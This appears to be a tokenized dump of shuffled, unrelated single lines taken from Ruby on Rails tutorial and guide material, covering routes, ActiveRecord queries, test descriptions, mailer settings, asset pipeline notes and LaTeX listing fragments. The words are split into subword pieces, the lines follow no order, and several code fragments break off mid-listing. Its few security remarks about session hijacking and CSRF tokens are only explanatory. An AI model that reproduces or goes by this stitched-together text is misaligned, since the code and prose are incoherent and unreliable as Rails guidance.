▁class ▁My sql A d a p ter ▁< ▁ Abstract A d a p ter
▁RSpec ' s ▁\ text tt { let } ▁method ▁provides ▁a ▁convenient ▁way ▁to ▁create ▁local ▁variables ▁inside ▁tests .
▁Inde ed , ▁the ▁Bootstrap ▁framework ▁defines ▁a ▁large ▁number ▁of ▁variables ▁for ▁ color s , ▁available ▁online ▁on ▁the ▁\ href { http :// get bootstrap ▖ com / custom ize / # less - variable s } { Bootstrap ▁page ▁of ▁L ess ▁variables } .
▁Link ing ▁the ▁button ▁to ▁the ▁signup ▁page .
▁self ▖ lock ing _ column ▁= ▁: lock _ client _ column
▁In ▁addition , ▁both ▁examples ▁reference ▁the ▁\ k ode { page } ▁variable .
▁This ▁kind ▁of ▁code ▁requires ▁the ▁exist ence ▁of ▁a ▁\ k ode { signed \_ in ?}\ ▁boolean , ▁which ▁we ' ll ▁now ▁define .
▁H e ▁ got ▁around ▁it ▁by ▁sending ▁a ▁GET ▁to ▁the ▁page ▁right ▁before ▁adding ▁a ▁user ▁and ▁pa rs ing ▁the ▁result ▁for ▁the ▁CSRF ▁token .
▁D ir ec tive s ▁are ▁processed ▁to p ▁to ▁bottom , ▁but ▁the ▁order ▁in ▁which ▁files ▁are ╼ include d ▁by ▁` require _ tree ` ▁is ▁un spec if i ed ▖
▁| ▁PATCH / PUT ▁| ▁ / photos / : id ▁| ▁images # update ▁| ▁ photo _ path (: id ) ▁|
▁You ▁can ▁do ▁file ▁g lo b b ing ▁as ▁well ▁using ▁`@ import ▁" * " `, ▁and ▁`@ import ▁" ** /* " ` ▁to ▁add ▁the ▁whole ▁ tree ▁which ▁is ▁equivalent ▁to ▁how ▁` require _ tree ` ▁works ▖
▁format ▖ atom
▁### ▁` truncate `
▁def ▁show
▁P lease ▁note ▁that ▁you ▁should ▁wait ▁to ▁set ▁` secret _ key _ base ` ▁un til ▁you ▁have ▁100 % ▁of ▁your ▁user base ▁on ▁Rails ▁4 ▖ x ▁and ▁are ▁reason ably ▁sure ▁you ▁will ▁not ▁need ▁to ▁ rollback ▁to ▁Rails ▁3 ▖ x ▖
▁The ▁` belongs _ to ` ▁association ▁supports ▁these ▁options :
▁In ▁this ▁section , ▁we ' ll ▁change ▁the ▁\ k ode { README ▖ rdoc } ▁file ▁to ▁\ k ode { README ▖ md }, ▁while ▁tak ing ▁the ▁opportunit y ▁to ▁add ▁some ▁Rails ▁Tutorial - - specific ▁content ▁to ▁the ▁README ▁file .
▁def ▁destroy
▁In ▁particular , ▁ persistent ▁cookies ▁are ▁vulnerable ▁to ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Session _ hijack ing } { session ▁hijacking }, ▁in ▁which ▁an ▁attacker ▁uses ▁a ▁ st ol en ▁remember ▁token ▁to ▁log ▁in ▁as ▁a ▁particular ▁user .
▁1▖ me g a by te ▁# ▁=> ▁10 48 57 6
▁config ▖ middleware ▖ insert _ after ▁ActiveRecord :: Query Cache , ▁ Lifo :: Cache , ▁page _ cache : ▁false
▁date ▖ advance ( months : ▁2, ▁day s : ▁- 2 ) ▁# ▁=> ▁We d , ▁ 04 ▁A ug ▁2010
▁Because ▁we ' ll ▁need ▁to ▁log ▁the ▁user ▁in , ▁we ▁also ▁have ▁to ▁include ▁a ▁valid ▁password ▁to ▁compare ▁with ▁the ▁password ▁submitted ▁to ▁the ▁Sessions ▁controller ' s ▁\ k ode { create } ▁action .
▁Here ▁I ' ve ▁used ▁the ▁usual ▁Ruby ▁convention ▁of ▁ putting ▁an ▁extra ▁ space ▁at ▁the ▁two ▁end s ▁of ▁the ▁hash --- a ▁convention ▁ignore d ▁by ▁the ▁console ▁output .
▁Fin ally , ▁in ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset } ▁we ' ll ▁add ▁account ▁activation ▁( the re by ▁confirm ing ▁a ▁valid ▁email ▁address ) ▁and ▁password ▁resets .
▁* ▁`: location ` ▁- ▁The ▁location ▁of ▁the ▁ sendmail ▁execut able ▖
▁In ▁the ▁present ▁design , ▁an ▁attacker ▁with ▁both ▁cookies ▁can ▁log ▁in ▁as ▁the ▁user ▁only ▁un til ▁the ▁user ▁log s ▁out ▖)
▁In ▁Section ~\ ref { sec : signup _ error _ messages }, ▁we ' ll ▁see ▁how ▁to ▁pro p a g ate ▁this ▁requirement ▁up ▁to ▁the ▁signup ▁form ▁for ▁creating ▁new ▁users .
▁T hanks ▁to ▁reader ▁ Y o el ▁A d ler ▁for ▁point ing ▁out ▁this ▁ subtle ▁issue , ▁and ▁for ▁ discover ing ▁the ▁solution .
▁This ▁option ╼ is ▁off ▁by ▁default , ▁but ▁can ▁be ▁enabled ▁if ▁your ▁server ▁supports ▁it ▖
▁Noti ce ▁how ▁many ▁files ▁and ▁directories ▁the ▁\ k ode { rails } ▁command ▁creates .
▁Conditions ▁can ▁either ▁be ▁specified ▁as ▁a ▁string , ▁array , ▁or ▁hash .
▁Convert ing ▁these ▁requirements ▁to ▁assertions ▁and ▁recall ing ▁that ▁the ▁\ k ode { feed } ▁is ▁in ▁the ▁User ▁model ▁( Listing ~\ ref { code : proto _ status _ feed }) ▁gives ▁the ▁updated ▁User ▁model ▁test ▁show n ▁in ▁Listing ~\ ref { code : full _ feed _ test } .
▁A c ce p t s ▁a ▁valid ▁ week ▁day ▁symbol ▁( e ▖ g ▖ ▁`: monday ` ) .
▁Then ▁merge ▁back ▁into ▁the ▁master ▁branch ▁and ▁push ▁to ▁the ▁remote ▁repository :
▁If ▁you ▁look ▁in ▁the ▁` db / migrate / 20 140 1 20 19 17 2 9 _ create _ articles ▖ rb ` ▁file ▁( remember ,╼ your s ▁will ▁have ▁a ▁slightly ▁different ▁name ), ▁here ' s ▁what ▁you ' ll ▁find :
▁email = michael %40 michael hartl ▖ com ╼╼ This ▁link ▁will ▁ expire ▁in ▁two ▁hours .
▁X - Runtime : ▁0▖0 8 34 9 6
▁First , ▁we ▁need ▁to ▁add ▁some ▁configuration ▁to ▁our ▁application ' s ▁development ▁environment , ▁as ▁show n ▁in ▁Listing ~\ ref { code : development _ email _ settings } .
▁as ▁show n ▁in ▁Listing ~\ ref { code : log _ out _ with _ forget } .
▁ Follow ing ▁the ▁practice ▁from ▁Section ~\ ref { sec : requiring _ logged _ in _ users }, ▁we ' ll ▁put ▁action - level ▁tests ▁of ▁access ▁control ▁in ▁the ▁Users ▁controller ▁test ▁file .
▁# ▁via ▁an ▁association
▁With out ▁this ▁change , ▁the ▁application ╼ w o ul d ▁serve ▁the ▁ precompile d ▁assets ▁from ▁` / assets ` ▁in ▁development , ▁and ▁you ▁would ╼ not ▁see ▁any ▁local ▁changes ▁un til ▁you ▁ compile ▁assets ▁again .
▁ Adding ▁an ▁\ k ode {@ microposts } ▁instance ▁variable ▁to ▁the ▁user ▁\ k ode { show } ▁action .
▁message : ▁" % { value } ▁is ▁re serv ed ▖ "
▁ Base d ▁on ▁the ▁routes ▁defined ▁in ▁Listing ~\ ref { code : following _ followers _ action s _ routes }, ▁we ▁need ▁to ▁call ▁them ▁\ k ode { following } ▁and ▁\ k ode { followers } .
▁For t un ate ly ▁Action ▁Mailer ▁provides ▁ hook s ▁to ▁inter ce p t ▁every ╼ email ▖
▁As ▁in ▁Listing ~\ ref { code : email _ format _ validation _ tests }, ▁Listing ~\ ref { code : email _ format _ validation _ tests } ▁includes ▁a ▁custom ▁error ▁message ▁to ▁identify ▁the ▁exact ▁address ▁caus ing ▁any ▁failure .
▁The ▁engine ▁that ▁this ▁guide ▁cover s ▁provides ▁ submitting ▁articles ▁and ▁comment ing ╼ function al ity ▁and ▁follows ▁a ▁similar ▁thread ▁to ▁the ▁[ Getting ▁Start ed ╼ G u ide ]( getting _ started ▖ html ), ▁with ▁some ▁new ▁t w ist s .
▁We ▁see ▁here ▁that ▁the ▁\ k ode { nil } ▁object ▁doesn ' t ▁itself ▁respond ▁to ▁the ▁\ k ode { empty ?}\ ▁method , ▁but ▁\ k ode { nil ▖ to \_ s } ▁does .
▁Client ▖ order (" created _ at ▁ASC ")
▁Thu s , ▁in ▁this ▁case ▁the ▁behavior ▁is ▁different ▁for ▁` nil `, ▁and ▁the ▁difference s ▁with ▁` K ernel # Array ` ▁explained ▁above ▁apply ▁to ▁the ▁rest ▁of ▁` object ` s .
▁( This ▁uses ▁the ▁\ k ode { touch } ▁trick ▁from ▁Section ~\ ref { sec : green } ▁ en ▁route , ▁but ▁you ▁can ▁create ▁the ▁file ▁however ▁you ▁like ▖)
▁as ▁show n ▁in ▁Listing ~\ ref { code : users _ controller _ test _ signup _ route } .
▁validate ▁: expiration _ date _ cannot _ be _ in _ the _ past ,
▁A ▁working ▁ preview ▁method ▁for ▁password ▁reset .
▁f ▁ shuffle ╼ > > ▁self ▖ ?( '') ▖ ? ▖ ? ╼ > > ▁end ╼ > > ▁end ╼ > > ▁" foobar "▖ shuffle ╼ => ▁" bo ra fo " ╼\ end { code }╼\ end { code listing } ╼ ▁% ▁subsection ▁modify ing _ built _ in _ classes ▁( end )╼╼ ▁\ subsection { A ▁controller ▁class } ▁% ▁( fold )╼ ▁\ label { sec : a _ controller _ class }╼╼
▁in ▁Listing ~\ ref { code : authenticated _ p _ fixed } ▁and
▁Co mb in ing ▁this ▁with ▁a ▁\ k ode { presence } ▁validation ▁( Section ~\ ref { sec : presence _ validation }) ▁to ▁prevent ▁non blank ▁passwords , ▁this ▁lead s ▁to ▁the ▁User ▁model ▁show n ▁in ▁Listing ~\ ref { code : password _ implementation } .
▁In ▁order ▁to ▁test ▁the ▁form ▁submission , ▁we ▁need ▁to ▁issue ▁a ▁\ text tt { POST } ▁request ▁to ▁the ▁\ k ode { users \_ path } ▁( Table ~\ ref { table : RESTful _ users }), ▁which ▁we ▁can ▁do ▁with ▁the ▁\ k ode { post } ▁function :
▁A ▁common ▁pattern ▁in ▁stylesheets ▁is ▁ having ▁rules ▁that ▁apply ▁to ▁nested ▁elements .
▁The ▁clean est ▁way ▁to ▁do ▁this ▁is ▁to ▁reset ▁the ▁database ▁with ▁the ▁\ k ode { db : reset } ▁Rake ▁task :
▁Because ▁we ' re ▁inside ▁the ▁user ▁model , ▁we ▁can ▁also ▁omit ▁\ k ode { self }, ▁yield ing ▁the ▁most ▁ idiomatic ally ▁correct ▁version :
▁In ▁this ▁case , ▁each ▁\ k ode { div } ▁has ▁a ▁CSS ▁class ▁as ▁well .
▁This ▁is ▁so ▁that ▁the ▁engine ▁routes ▁are ▁con f in ed ╼ to ▁the ▁engine ▁itself ▁and ▁can ▁be ▁m o un ted ▁at ▁a ▁specific ▁point ▁as ▁show n ▁in ▁the ╼[ test ▁directory ](# test - directory ) ▁section ▖
▁CSS ▁for ▁styling ▁error ▁messages .
▁# ▁config ▖ force _ ssl ▁= ▁true
▁We ▁can ▁see ▁from ▁Listing ~\ ref { code : relationships _ controller _ following } ▁why ▁the ▁security ▁issue ▁mentioned ▁above ▁is ▁minor : ▁if ▁an ▁un logged - in ▁user ▁were ▁to ▁hit ▁either ▁action ▁directly ▁( e ▖ g ▖ , ▁using ▁a ▁command - line ▁tool ▁like ▁\ k ode { curl }), ▁\ k ode { current \_ user } ▁would ▁be ▁\ k ode { nil }, ▁and ▁in ▁both ▁cases ▁the ▁action ' s ▁second ▁line ▁would ▁raise ▁an ▁exception , ▁result ing ▁in ▁an ▁error ▁but ▁no ▁ha rm ▁to ▁the ▁application ▁or ▁its ▁data .
▁A ▁\ k ode { Gemfile } ▁for ▁the ▁ demo ▁app .
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁nested : ▁ { a : ▁3 , ▁5 ▁=> ▁ 5}} ▖ deep _ stringify _ keys
▁ Word ing
▁assemblies ▖ create ( attributes ▁= ▁{})
▁Even ▁when ▁you ' re ▁very ▁careful , ▁things ▁can ▁some times ▁go ▁wrong ▁when ▁developing ▁Rails ▁applications .
▁I ▁ got ▁this ▁from ▁the ▁\ href { https :// help ▖ ubuntu ▖ com / community / ImageMagick } { of ficial ▁U b un t u ▁documentation } .
▁This ▁is ▁equivalent ▁to ▁writing :
▁But ▁you ▁can ' t ▁rely ▁on ▁this ▖
▁The ▁ jQuery ▁library ▁provides ▁a ▁large ▁number ▁of ▁methods ▁for ▁ manipulati n g ▁the ▁ DOM , ▁but ▁here ▁we ▁will ▁need ▁only ▁two .
▁Return s ▁a ▁link ▁tag ▁that ▁browsers ▁and ▁feed ▁readers ▁can ▁use ▁to ▁ auto - de t ec t ▁an ▁ RSS ▁or ▁ Atom ▁feed .
▁The ▁user ▁profile ▁page ▁with ▁code ▁for ▁microposts --- but ▁no ▁microposts .
▁The ▁\ href { http :// sqlite browser ▖ org /}{ D B ▁B row s er ▁for ▁SQLite } ▁with ▁our ▁new ▁\ k ode { users } ▁table .
▁#### ▁ Edit ▁the ▁Mailer
▁create ▁app / mailers / application _ mailer ▖ rb
▁* ▁his ▁or ▁ her s ▖▖▖ ▁use ▁their s .
▁This ▁way , ▁when ▁the ▁validation ▁tests ▁fail ▁we ' ll ▁know ▁it ' s ▁for ▁the ▁right ▁reason ▁( and ▁not ▁because ▁the ▁initial ▁object ▁was ▁invalid ▁in ▁the ▁first ▁place ) .
▁The ▁` inquiry ` ▁method ▁convert s ▁a ▁string ▁into ▁a ▁` String In q u ir er ` ▁object ▁making ▁equal ity ▁check s ▁pre tt i er .
▁M a k ing ▁the ▁\ k ode { name } ▁and ▁\ k ode { email } ▁attributes ▁ accessible .
▁=> ▁[ 0, ▁1, ▁2, ▁3 , ▁4 , ▁5 , ▁6 , ▁7 , ▁ 8, ▁ 9 ]
▁In ▁addition ▁to ▁the ▁above ▁special ▁tags , ▁you ▁can ▁supply ▁a ▁final ▁hash ▁of ▁standard ▁HTML ▁options , ▁such ▁as ▁`: class `, ▁`: id ` ▁or ▁`: name `:
▁Recall ▁from ▁the ▁ proto - feed ▁in ▁Section ~\ ref { sec : a _ proto _ feed } ▁that ▁Active ▁Record ▁uses ▁the ▁\ k ode { where } ▁method ▁to ▁accomplish ▁the ▁kind ▁of ▁select ▁show n ▁above , ▁as ▁illustrate d ▁in ▁Listing ~\ ref { code : proto _ status _ feed } .
▁# ▁POST ▁ / users
▁Let ' s ▁check ▁the ▁status ▁to ▁see ▁what ' s ▁up :
▁We ▁could ▁make ▁an ▁entire ly ▁new ▁module ▁for ▁authentication , ▁but ▁the ▁Sessions ▁controller ▁already ▁comes ▁ equ ip ped ▁with ▁a ▁module , ▁name ly , ▁\ k ode { Sessions Helper } .
▁ en code d _ content ▁= ▁S pe cial E n code ( File ▖ read (' / path / to / filename ▖ jpg ') )
▁### ▁Gemfile
▁A ▁mockup ▁of ▁the ▁Home ▁page ▁with ▁a ▁ proto - feed .
▁invoke ▁ js
▁The ▁User ▁model ▁with ▁added ▁password ▁reset ▁attributes .
▁When ever ▁you ' re ▁con f used ▁about ▁something ▁in ▁a ▁Rails ▁application , ▁it ' s ▁a ▁good ▁practice ▁to ▁put ▁\ k ode { debugger } ▁close ▁to ▁the ▁code ▁you ▁think ▁m ight ▁be ▁caus ing ▁the ▁trouble .
▁g ▖ test _ framework ▁: test _ unit
▁To ▁run ▁all ▁the ▁tests , ▁do :
▁: prev ent _ delivery _ to _ guest s ,
▁At ▁this ▁point , ▁go ▁a head ▁and ▁create ▁a ▁micropost ▁or ▁two , ▁tak ing ▁care ▁to ▁make ▁sure ▁that ▁at ▁least ▁one ▁has ▁a ▁\ k ode { user \_ id } ▁of ~\ k ode {1} ▁to ▁match ▁the ▁id ▁of ▁the ▁first ▁user ▁created ▁in ▁Section ~\ ref { sec : a _ user _ tour } .
▁#### ▁file _ field
▁as ▁show n ▁in ▁Listing ~\ ref { code : initial _ micropost _ spec } .
▁NOTE : ▁ _ The ▁same ▁security ▁pre c a u tion s ▁have ▁to ▁be ▁taken ▁for ▁Ajax ▁actions ▁as ▁for ▁" normal " ▁one s ▖
▁@ assembly _ count ▁= ▁@ part ▖ assemblies ▖ size
▁If ▁you ▁have ▁other ▁manifest s ▁or ▁individual ▁stylesheets ▁and ▁JavaScript ▁files ▁to ╼ include , ▁you ▁can ▁add ▁them ▁to ▁the ▁` precompile ` ▁array ▁in ▁` config / initializers / assets ▖ rb `:
▁Before ▁mov ing ▁on ▁with ▁the ▁rest ▁of ▁the ▁introduction , ▁I ' d ▁like ▁to ▁take ▁a ▁moment ▁to ▁address ▁the ▁one ▁issue ▁that ▁d ogg ed ▁the ▁Rails ▁framework ▁the ▁most ▁in ▁its ▁ early ▁day s : ▁the ▁suppose d ▁in ability ▁of ▁Rails ▁to ▁`` scale '' --- i ▖ e ▖ , ▁to ▁handle ▁large ▁amount s ▁of ▁traffic .
▁### ▁Active ▁Record ▁O b server ▁and ▁Action ▁Controller ▁S w eep er
▁### ▁ Write ▁Your ▁Code
▁That ' s ▁the ▁method ▁` get `, ▁` post `, ▁etc ▖ , ▁ delegate ▁the ▁work ▁to .
▁new ▁join ▁models ▁are ▁created ▁for ▁new ly ▁ associated ▁objects , ▁and ▁if ▁some ▁are ▁g one ▁their ▁rows ▁are ▁delete d .
▁articles ▁GET ▁ / articles (▖ : format ) ▁articles # index
▁### ▁Start ing ▁up ▁the ▁Web ▁ Server
▁validate ▁: active _ customer , ▁on : ▁: create
▁We ▁have n ' t ▁changed ▁the ▁data ▁model ▁in ▁this ▁chapter , ▁so ▁running ▁the ▁migration ▁at ▁Heroku ▁should n ' t ▁be ▁necessary , ▁but ▁only ▁if ▁you ▁followed ▁the ▁steps ▁in ▁Section ~\ ref { sec : modeling _ users _ co nclusion } .
▁In ▁such ▁a ▁case , ▁the ▁result ing ▁redirect ▁would ▁issue ▁a ▁\ k ode { GET } ▁request ▁to ▁a ▁URL ▁expect ing ▁\ k ode { POST }, ▁\ k ode { PATCH }, ▁or ▁\ k ode { DELETE }, ▁there by ▁caus ing ▁an ▁error .
▁ Adding ▁an ▁( empty ) ▁\ k ode {@ feed \_ items } ▁instance ▁variable ▁to ▁the ▁\ k ode { create } ▁action .
▁The ▁\ k ode { update } ▁action ▁needed ▁to ▁get ▁the ▁tests ▁in ▁Listing ~\ ref { code : successful _ edit _ test } ▁to ▁pass ▁is ▁similar ▁to ▁the ▁final ▁form ▁of ▁the ▁\ k ode { create } ▁action ▁( Listing ~\ ref { code : login _ upon _ signup }), ▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ update _ action } .
▁The ▁new ▁user ▁view ▁with ▁partial .
▁To ▁implement ▁the ▁data ▁model ▁in ▁Figure ~\ ref { fig : user _ model _ password _ digest } ▁ , ▁we ▁first ▁generate ▁an ▁appropriate ▁migration ▁for ▁the ▁\ k ode { password \_ digest } ▁column .
▁=> ▁2
▁# ▁gem ▁' debugger ', ▁group : ▁ [: development , ▁: test ]
▁a 1 ▁= ▁A ▖ new
▁Un like ▁the ▁\ k ode { new ▖ html ▖ erb } ▁view , ▁which ▁we ▁created ▁with ▁the ▁generator ▁in ▁Listing ~\ ref { code : generate _ users _ controller }, ▁the ▁\ k ode { show ▖ html ▖ erb } ▁file ▁doesn ' t ▁current ly ▁exist , ▁so ▁you ' ll ▁have ▁to ▁create ▁it ▁by ▁hand , ▁and ▁then ▁fill ▁it ▁with ▁the ▁content ▁show n ▁in ▁Listing ~\ ref { code : stub _ user _ view } .
▁Documentation ▁has ▁to ▁be ▁con ci se ▁but ▁ com pre h en s ive ▖
▁mail ( to : ▁user ▖ email ,
▁With ▁that , ▁we ' re ▁done ▁with ▁the ▁links ▁and ▁named ▁routes , ▁at ▁least ▁un til ▁we ▁add ▁a ▁route ▁for ▁logging ▁in ▁( Chapter ~\ ref { cha : log _ in _ log _ out }) .
▁In ▁this ▁case , ▁the ▁\ k ode { div } ▁has ▁a ▁CSS ▁class ▁as ▁well ▁(\ k ode { container }) .
▁WARNING ▖ ▁Controller s ▁need ▁to ▁be ▁ aware ▁of ▁any ▁re de f in it ion ▁of ▁` to _ param ` ▁because ▁when ▁a ▁request ▁like ▁that ▁comes ▁in ▁" 3 57 - j o h n - s m i th " ▁is ▁the ▁value ▁of ▁` params [: id ]` .
▁te }╼╼ ▁% ▁subsection ▁destroying _ microposts ▁( end )╼╼ \ subsection { Micropost ▁tests } ▁% ▁( fold )╼\ label { sec : micropost _ tests }╼╼
▁Article ▖ first ▖ cat eg or ies ▖ any ?
▁config ▖ assets ▖ cache _ store ▁= ▁: memory _ store
▁See ╼[ the ▁ MySQL ▁ man u al ]( http :// dev ▖ mysql ▖ com / doc / ref man / 5 ▖ 6 / en / multiple - column - index es ▖ html )╼ for ▁more ▁details ▁about ▁multiple ▁column ▁index es .
▁< h 2 > A d d ▁a ▁comment : </ h 2 >
▁By ▁default , ▁Rails ▁ assumes ▁that ▁primary ▁key ▁columns ▁are ▁named ▁` id ` ▁( and ▁this ▁configuration ▁option ▁doesn ' t ▁need ▁to ▁be ▁set ▖)
▁* ▁If ▁you ▁are ▁not ▁using ▁ Pro t ec ted ▁Attributes , ▁you ▁can ▁remove ▁any ▁options ▁related ▁to ╼ this ▁gem ▁such ▁as ▁` white list _ attributes ` ▁or ▁` mass _ assignment _ sanitizer ` ▁options .
▁It ▁is ▁possible ▁to ▁pass ▁variables ▁to ▁Rails ▁partials .
▁# ▁Use ▁C api str a no ▁for ▁deployment
▁That ▁may ▁be ▁hand y ▁to ▁ com put e ▁method ▁names ▁in ▁a ▁language ▁that ▁follows ▁that ▁convention , ▁for ▁example ▁JavaScript .
▁A ▁user ▁has ▁many ▁microposts .
▁The ▁complete d ▁Sessions ▁controller ▁\ k ode { create } ▁action ▁( not ▁yet ▁working ) .
▁### ▁` config / secrets ▖ yml `
▁resources ▁: articles ▁do
▁ Follow ing ▁the ▁model ▁from ▁Section ~\ ref { sec : signup _ form } ▁for ▁the ▁signup ▁page , ▁our ▁plan ▁is ▁to ▁create ▁a ▁login ▁form ▁for ▁creating ▁new ▁sessions , ▁as ▁ mock ed ▁up ▁in ▁Figure ~\ ref { fig : login _ mockup } .
▁### ▁An on y m ous
▁Fin ally , ▁a lthough ▁we ▁won ' t ▁use ▁it ▁in ▁this ▁tutorial , ▁we ' ll ▁record ▁the ▁time ▁and ▁date ▁of ▁the ▁activation ▁in ▁case ▁we ▁want ▁it ▁for ▁future ▁reference .
▁Associations ▁use ▁this ▁method ▁to ▁infer ▁foreign ▁keys , ▁for ▁example ▁` has _ one ` ▁and ▁` has _ many ` ▁do ▁this :
▁ Location s ▁for ▁ Initial i z ation ▁Code
▁# ▁=> ▁Fri , ▁ 06 ▁A ug ▁2010 ▁17 : 11 : 58 ▁C E ST ▁+ 02 :00
▁Active ▁Job ▁provides ▁a ▁Rails ▁generator ▁to ▁create ▁job s ▖
▁By ▁the ▁way , ▁the ▁extra ▁level ▁of ▁indentation ▁on ▁\ k ode { create \_ remember \_ token } ▁is ▁there ▁to ▁make ▁it ▁ visual ly ▁apparent ▁which ▁methods ▁are ▁defined ▁after ▁\ k ode { private } .
▁Rails ▁can ▁validate ▁a ▁variety ▁of ▁conditions ▁in ▁a ▁model ,╼ including ▁the ▁presence ▁or ▁uniqueness ▁of ▁columns , ▁their ▁format , ▁and ▁the ╼ ex ist ence ▁of ▁ associated ▁objects ▖
▁[ "1" , ▁" 2 ", ▁"3"]
▁return ▁if ▁self [" Cache - Control "] ▖ present ?
▁If ▁there ▁is ▁no ▁such ▁controller - specific ▁layout , ▁Rails ▁will ▁use ▁` app / views / layouts / application ▖ html ▖ erb ` ▁or ▁` app / views / layouts / application ▖ builder ` ▖
▁A ▁GitHub ▁repository ▁page ▖ ~\ href { http :// railstutorial ▖ org / images / figures / github _ repository _ page _4_0 - full ▖ png }{( full ▁size )}
▁Verify ▁that ▁the ▁code ▁in ▁Listing ~\ ref { code : gravatar _ option } ▁allows ▁the ▁\ k ode { gravatar \_ for } ▁helper ▁defined ▁in ▁Section ~\ ref { sec : a _ gravatar _ image } ▁to ▁take ▁an ▁optional ▁\ k ode { size } ▁parameter , ▁allow ing ▁code ▁like ▁\ k ode { gravatar \_ for ▁user , ▁size : ▁50 } ▁in ▁the ▁view .
▁To ▁activate ▁the ▁root ▁route , ▁un comment ▁this ▁line ▁by ▁remov ing ▁the ▁hash ▁character ▁and ▁then ▁replace ▁it ▁with ▁the ▁code ▁in ▁Listing ~\ ref { code : hello _ root _ route }, ▁which ▁tell s ▁Rails ▁to ▁send ▁the ▁root ▁route ▁to ▁the ▁\ k ode { hello } ▁action ▁in ▁the ▁Application ▁controller .
▁< td > <%= ▁book ▖ content ▁%></ td >
▁If ▁your ▁comment ▁simply ▁say s ▁" + 1 ", ▁then ▁ o d d s ▁are ▁that ▁other ▁review ers ▁are n ' t ▁going ▁to ▁take ▁it ▁too ▁serious ly ▖
▁### ▁S a v ing ▁data ▁in ▁the ▁controller
▁as ▁show n ▁in ▁Listing ~\ ref { code : test _ helper _ sign _ in } .
▁person ▖ errors ▖ messages ▁# ▁=> ▁ { }
▁L oo fa h ▁in ▁turn ▁uses ▁No k o g i ri , ▁which ╼ wrap s ▁ XML ▁ parse rs ▁written ▁in ▁both ▁C ▁and ▁ Java , ▁so ▁sanit i z ation ▁should ▁be ▁faster ╼ no ▁matter ▁which ▁Ruby ▁version ▁you ▁run .
▁For ▁example , ▁to ▁test ▁a ▁signup ▁page ▁manually , ▁we ▁would ▁have ▁to ▁visit ▁the ▁page ▁in ▁a ▁browser ▁and ▁then ▁submit ▁alter n ate ly ▁invalid ▁and ▁valid ▁data , ▁verify ing ▁in ▁each ▁case ▁that ▁the ▁application ' s ▁behavior ▁was ▁correct .
▁Fin ally , ▁the ▁assets ▁for ▁this ▁resource ▁are ▁generated ▁in ▁two ▁files :
▁The ▁profile ▁of ▁a ▁user ▁to ▁follow , ▁with ▁a ▁follow ▁button ▖ ~\ href { http :// railstutorial ▖ org / images / figures / page _ flow _ other _ profile _ follow _ button _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁ postgresql :// localhost / my _ database
▁=> ▁nil
▁If ▁you ▁don ' t ▁want ▁to ▁ force ▁a ▁layout ▁on ▁to ▁users ▁of ▁the ▁engine , ▁then ▁you ▁can ╼ delete ▁this ▁file ▁and ▁reference ▁a ▁different ▁layout ▁in ▁the ▁controllers ▁of ▁your ╼ engine .
▁as ▁seen ▁in ▁Listing ~\ ref { code : password _ migration } .
▁ SELECT ▁* ▁FROM ▁articles ▁WHERE ▁` trashed ` ▁= ▁0
▁Action ▁View
▁class _ name : ▁" Order "
▁* ▁Rails ▁4▖0 ▁ deprecated ▁` ActionController :: P er form ance Test ` ▁in ▁favor ▁of ▁` ActionDispatch :: P er form ance Test ` .
▁The ▁` new ` ▁action ▁is ▁now ▁creating ▁a ▁new ▁instance ▁variable ▁called ▁`@ article `, ▁and ╼ you ' ll ▁see ▁why ▁that ▁is ▁in ▁just ▁a ▁few ▁moment s .
▁ Adding ▁ CarrierWave ▁to ▁the ▁\ k ode { Gemfile } .
▁With ▁this ▁change , ▁creating ▁a ▁new ▁order ▁for ▁a ▁particular ▁customer ▁is ▁easier :
▁ nick ▖ save
▁the ╼[ * Ruby ▁on ▁Rails ▁Tutorial * ]( http :// railstutorial ▖ jp / )
▁Here ▁the ▁\ k ode { page } ▁parameter ▁comes ▁from ▁\ k ode { params [: page ]} , ▁which ▁is ▁generated ▁automatically ▁by ▁\ k ode { will \_ paginate } .
▁* ▁` config ▖ assets ▖ version ` ▁is ▁an ▁option ▁string ▁that ▁is ▁used ▁in ▁M D 5 ▁hash ▁generation ▖
▁\ label { table : url _ m app ing } }╼\ end { table }╼╼\ subsection { Contact ▁page } ▁% ▁( fold )╼\ label { sec : contact _ page }╼╼
▁We ▁will ▁add ▁an ▁important ▁new ▁test , ▁though , ▁writing ▁our ▁first ▁\ emph { integration ▁test } ▁to ▁check ▁that ▁the ▁links ▁on ▁the ▁final ▁layout ▁are ▁correct ▁( Section ~\ ref { sec : layout _ link _ tests }) .
▁Rails ▁will ▁execute ▁this ▁migration ▁command ▁and ▁tell ▁you ▁it ▁created ▁the ▁Article s ╼ table .
▁x ▁= ▁x ▁+ ▁1
▁You ▁can ▁verify ▁at ▁this ▁point ▁that ▁the ▁test ▁suite ▁is ▁failing :
▁ _ Remember ▁to ▁escape ▁these ▁header ▁fields , ▁too .
▁Note ▁that ▁we ' ve ▁included ▁a ▁flag ▁to ▁skip ▁ generating ▁tests .
▁We ' ll ▁see ▁in ▁Section ~\ ref { sec : demo _ user _ has _ many _ microposts } ▁( and ▁more ▁fully ▁in ▁Chapter ~\ ref { cha : user _ microposts }) ▁how ▁this ▁\ k ode { user \_ id } ▁attribute ▁allows ▁us ▁to ▁succinct ly ▁express ▁the ▁not ion ▁that ▁a ▁user ▁ potentially ▁has ▁many ▁ associated ▁microposts .
▁ { code : palindrome _ if } ? ▁How ▁does ▁it ▁change ▁if ▁you ▁re as sign ▁the ▁variable ~\ k ode { s } ▁to ▁the ▁string ▁`` \ href { http :// www ▖ dictionary ▖ com / b row se / on o ma to po e ia } { on o ma to po e ia } '' ? ▁\ emph { Hint } : ▁Use ▁up - ar row ▁to ▁retrieve ▁and ▁edit ▁previous ▁commands ╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 5 19 87 0 ' ></ span >╼ \ end { enumerate }╼╼\ begin { code listing }╼\ label { code : palindrome _ if }╼\ code caption { A ▁simple ▁ palindrome ▁test ▖ } ╼ %= ▁ lang : i rb ╼\ begin { code } ╼ > > ▁ puts ▁" It ' s ▁a ▁ palindrome !" ▁if ▁ s ▁== ▁ s ▖ reverse ╼\ end { code }╼\ end { code listing }╼╼ ▁\ subsection { M e th o d ▁definition s } ▁% ▁( fold )╼ ▁\ label { sec : method _ de f in it ion s }╼╼
